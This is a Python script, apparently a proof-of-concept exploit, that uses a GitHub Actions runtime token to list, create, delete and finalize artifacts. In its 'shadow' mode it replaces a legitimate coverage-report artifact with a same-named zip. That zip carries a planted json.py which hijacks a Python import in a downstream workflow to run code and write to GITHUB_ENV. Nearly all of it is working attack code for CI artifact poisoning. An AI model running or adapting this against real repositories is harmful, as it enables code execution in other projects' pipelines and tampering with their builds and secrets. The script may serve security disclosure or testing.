#!/usr/bin/env python3
"""Minimal client for the Actions results (artifacts) twirp service."""
import base64, hashlib, json, os, subprocess, sys, time, zipfile

TOKEN = os.environ['ACTIONS_RUNTIME_TOKEN']
from urllib.parse import urlparse
_u = urlparse(os.environ['ACTIONS_RESULTS_URL'])
ORIGIN = f'{_u.scheme}://{_u.netloc}'
SVC = f'{ORIGIN}/twirp/github.actions.results.api.v1.ArtifactService'

def ids():
    t = TOKEN.split('.')[1]
    t += '=' * (-len(t) % 4)
    c = json.loads(base64.urlsafe_b64decode(t))
    for s in c['scp'].split(' '):
        p = s.split(':')
        if p[0] == 'Actions.Results':
            return p[1], p[2]
    raise SystemExit('no Actions.Results scope')

WR, JR = ids()

def rpc(method, body):
    import urllib.request
    req = urllib.request.Request(
        f'{SVC}/{method}', data=json.dumps(body).encode(),
        headers={'Authorization': 'Bearer ' + TOKEN, 'Content-Type': 'application/json'},
        method='POST')
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return json.loads(r.read().decode())
    except Exception as e:
        try:
            body = e.read().decode()
        except Exception:
            body = ''
        return {'__error': str(e), '__body': body[:500]}

def list_artifacts():
    return rpc('ListArtifacts', {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR})

def create(name):
    body = {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR,
            'name': name, 'mime_type': 'application/zip', 'version': 7}
    r = rpc('CreateArtifact', body)
    if not r.get('ok'):
        # retry without mime_type (some backends reject the field shape)
        body.pop('mime_type', None)
        r = rpc('CreateArtifact', body)
    return r

def upload(url, path):
    r = subprocess.run(['curl', '-sS', '-o', '/dev/null', '-w', '%{http_code}', '-X', 'PUT', url,
                        '-H', 'x-ms-blob-type: BlockBlob', '-H', 'Content-Type: application/zip',
                        '--data-binary', '@' + path], capture_output=True, text=True)
    return r.stdout.strip() + ' ' + r.stderr.strip()

def finalize(name, path):
    data = open(path, 'rb').read()
    h = hashlib.sha256(data).hexdigest()
    return rpc('FinalizeArtifact', {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR,
                                    'name': name, 'size': str(len(data)), 'hash': 'sha256:' + h})

def delete(name):
    return rpc('DeleteArtifact', {'workflow_run_backend_id': WR, 'workflow_job_run_backend_id': JR, 'name': name})

def mkzip(path, entries):
    with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED) as z:
        for n, d in entries:
            z.writestr(n, d)
    return path

def push(name, entries):
    path = os.path.join(os.environ.get('RUNNER_TEMP', '/tmp'), f'{name}-{int(time.time()*1000)}.zip')
    mkzip(path, entries)
    cr = create(name)
    if not cr.get('ok'):
        print('CREATE-FAILED', json.dumps(cr)[:400])
        return cr
    up = upload(cr['signed_upload_url'], path)
    fin = finalize(name, path)
    print('PUSH', name, 'upload=', up, 'finalize=', json.dumps(fin)[:300])
    return fin

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else 'probe'
    print('WR', WR, 'JR', JR, 'ORIGIN', ORIGIN)
    if mode == 'probe':
        print('LIST0', json.dumps(list_artifacts())[:1500])
        push('dup-probe', [('a.txt', 'one\n')])
        push('dup-probe', [('b.txt', 'two\n')])
        print('LIST1', json.dumps(list_artifacts())[:2500])
        print('DELETE', json.dumps(delete('dup-probe'))[:400])
        print('LIST2', json.dumps(list_artifacts())[:1500])
    elif mode == 'shadow':
        # wait for the official artifact, then add a same-named artifact with
        # attacker-chosen entry names (including ./json.py at the extract root)
        target = sys.argv[2] if len(sys.argv) > 2 else 'pr-coverage-report'
        deadline = time.time() + 240
        seen = False
        while time.time() < deadline:
            la = list_artifacts()
            arts = la.get('artifacts') or []
            names = [a.get('name') for a in arts]
            if target in names:
                seen = True
                print('SEEN', target, json.dumps([(a.get('name'), a.get('database_id') or a.get('databaseId')) for a in arts])[:800])
                break
            time.sleep(0.2)
        with open(os.path.join(os.environ.get('RUNNER_TEMP', '/tmp'), 'shadow-seen.txt'), 'w') as f:
            f.write(str(seen))
        payload = (
            "import os\n"
            "try:\n"
            "    ws = os.environ.get('GITHUB_WORKSPACE', '.')\n"
            "    open(os.path.join(ws, 'RCE_PROOF.txt'), 'w').write('RCE: python CWD import hijack executed\\n')\n"
            "    envf = os.environ.get('GITHUB_ENV')\n"
            "    if envf:\n"
            "        open(envf, 'a').write('RCE_IMPORT_PROOF=yes\\n')\n"
            "    print('RCE-PAYLOAD-EXECUTED')\n"
            "except Exception as e:\n"
            "    print('payload-error', e)\n"
        )
        entries = [
            ('bull-report/target/site/jacoco-aggregate/jacoco.xml',
             '<report><counter type="LINE" missed="1" covered="99"/></report>'),
            ('pr_number.txt', '1\n'),
            ('json.py', payload),
        ]
        # try direct duplicate create first; if the service refuses, delete then create
        path = os.path.join(os.environ.get('RUNNER_TEMP', '/tmp'), 'shadow.zip')
        mkzip(path, entries)
        cr = create(target)
        pushed = cr.get('ok')
        if not pushed:
            print('DUP-CREATE-FAILED', json.dumps(cr)[:400])
            print('DELETE-OFFICIAL', json.dumps(delete(target))[:400])
            cr = create(target)
            pushed = cr.get('ok')
        if pushed:
            print('UPLOAD', upload(cr['signed_upload_url'], path))
            print('FINALIZE', json.dumps(finalize(target, path))[:400])
        else:
            print('SHADOW-CREATE-FAILED', json.dumps(cr)[:400])
        print('LIST-FINAL', json.dumps(list_artifacts())[:1500])
    else:
        raise SystemExit('unknown mode')

main()
